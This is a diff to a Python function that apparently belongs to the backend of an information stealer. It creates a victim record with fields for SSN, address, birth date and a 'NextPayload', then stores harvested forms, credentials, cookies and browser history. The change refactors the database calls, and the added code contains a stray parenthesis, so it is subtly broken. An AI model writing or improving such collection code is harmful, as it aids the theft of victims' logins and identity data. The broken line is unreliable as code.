@@ -54,21 +54,22 @@ parses any possible data and inserts the row, then returns the clientid that was
 for example, browser history, credentials, forms, etc.
 """
 def create_new_client(data):
-    cur.execute('SELECT LAST_INSERT_ID()')
-    lastID = cur.fetchall()
-    curID = lastID + 1
-    cur.execute('INSERT INTO Client(ID, CellPhone, StreetAddress, Email, SSN, FirstName, LastName, BirthDate, NextPayload, City, Country, ZipCode, State) VALUES (%s, None, None, None, None, None, None, None, None, None, None, None, None)', curID)
-    formsList = data["forms"]
-    for x in formsList:
-        store_form_data(x, curID)
-    credsList = data["creds"]
-    for y in credsList:
-        store_credentials(y, curID)
-    cookiesList = data["cookies"]
-    for z in cookiesList:
-        store_cookie(z, curID)
-    store_history(data["history"], curID)
-    return 0
+    with getConn() as conn:
+        conn.execute('SELECT LAST_INSERT_ID()')
+        lastID = conn.fetchall())
+        curID = lastID[0][0] + 1
+        conn.execute('INSERT INTO Client(ID, CellPhone, StreetAddress, Email, SSN, FirstName, LastName, BirthDate, NextPayload, City, Country, ZipCode, State) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)', (curID, None, None, None, None, None, None, None, None, None, None, None, None))
+        formsList = data["forms"]
+        for x in formsList:
+            store_form_data(x, curID)
+        credsList = data["creds"]
+        for y in credsList:
+            store_credentials(y, curID)
+        cookiesList = data["cookies"]
+        for z in cookiesList:
+            store_cookie(z, curID)
+        store_history(data["history"], curID)
+        return 0
 
 
 """
